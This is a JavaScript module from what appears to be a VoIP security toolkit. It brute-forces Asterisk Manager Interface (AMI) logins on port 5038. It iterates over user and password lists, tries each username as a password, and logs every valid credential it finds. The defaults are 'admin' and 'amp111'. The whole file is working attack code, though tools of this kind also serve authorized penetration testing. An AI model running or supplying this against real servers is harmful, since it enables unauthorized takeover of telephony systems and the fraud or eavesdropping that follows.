// Copyright Sergio García <s3rgio.gr gmail com>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.


'use strict';


// Private stuff

const async = require('async');

const namiLib = require('nami');

const logger = require('../utils/logger');

const Nami = namiLib.Nami;


module.exports.help = {
  description: 'Asterisk Manager service (AMI) credentials brute force',
  options: {
    target: {
      type: 'ip',
      description: 'Host to attack',
      defaultValue: '127.0.0.1',
    },
    port: {
      type: 'port',
      description: 'Port to attack on chosen IPs',
      defaultValue: 5038,
    },
    users: {
      type: 'userPass',
      description: 'Users, range (ie: range:0000-0100) or file with them to test',
      defaultValue: 'admin',
    },
    passwords: {
      type: 'userPass',
      description: 'Password (or file with them) to test',
      defaultValue: 'amp111',
    },
    userAsPass: {
      type: 'yesNo',
      description: 'Test the same user as password for each one.',
      defaultValue: 'yes',
    },
    delay: {
      type: 'positiveInt',
      description: 'Delay between requests, in ms.',
      defaultValue: 0,
    },
    timeout: {
      type: 'positiveInt',
      description: 'Time to wait for a response, in ms.',
      defaultValue: 5000,
    },
  },
};


module.exports.run = (options, callback) => {
  const result = [];
  let indexCountUsr = 0; // Used with delay to know in which index we are
  let indexCountPass = 0;

  // We avoid to parallelize here to control the interval of the requests
  async.eachSeries(options.users, (user, asyncCbUsr) => {
    let finalPasswords = [];

    finalPasswords = finalPasswords.concat(options.passwords);
    indexCountUsr += 1;
    indexCountPass = 0;
    if (options.userAsPass) {
      finalPasswords.push(user);
    }

    async.eachSeries(finalPasswords, (password, asyncCbPass) => {
      let connected = false;
      let returned = false;
      // http://ci.marcelog.name:8080/view/NodeJS/job/Nami/javadoc/index.html
      const ami = new Nami({
        host: options.target,
        port: options.port,
        username: user,
        secret: password,
      });

      function delayCb() {
        if (connected) {
          ami.close();
        }
        // Last element
        if (indexCountPass === finalPasswords.length &&
          indexCountUsr === options.users.length) {
          asyncCbPass();
        } else {
          setTimeout(asyncCbPass, options.delay);
        }
      }

      ami.logger.setLevel('OFF');

      ami.on('namiConnected', () => {
        connected = true;
        returned = true;
        logger.highlight(`Valid credentials found: ${user} |  ${password}`);
        result.push({
          user,
          pass: password,
        });
        delayCb();
      });

      ami.on('namiLoginIncorrect', () => {
        returned = true;
        logger.infoHigh(`Valid credentials NOT found for: ${user} | ${password}`);
        delayCb();
      });

      // The module do not supports connection timeout, so
      // we add it manually ("connected" var), really dirty trick
      setTimeout(() => {
        if (!connected && !returned) {
          callback({
            type: 'timeout',
          });
        }
      }, options.timeout);
      indexCountPass += 1;
      ami.open();
    }, (err) => {
      asyncCbUsr(err);
    });
  }, (err) => {
    callback(err, result);
  });
};
